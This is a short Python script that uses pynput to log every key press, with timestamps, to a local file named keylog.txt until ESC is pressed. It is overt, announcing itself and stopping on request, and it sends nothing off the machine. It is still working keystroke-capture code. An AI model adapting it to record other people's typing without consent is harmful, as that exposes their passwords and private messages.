from pynput import keyboard
from datetime import datetime

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
       
        key_name = key.char if key.char is not None else str(key)
    except AttributeError:
       
        key_name = key.name

    with open("keylog.txt", "a") as f:
       f.write(f"{timestamp} - {key_name}\n")

def on_release(key):

    if key == keyboard.Key.esc:
        print("\nKeylogger stopped. Check keylog.txt for the result.")
        return False

def main():
    print("Hi! Press ESC to stop logging.")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()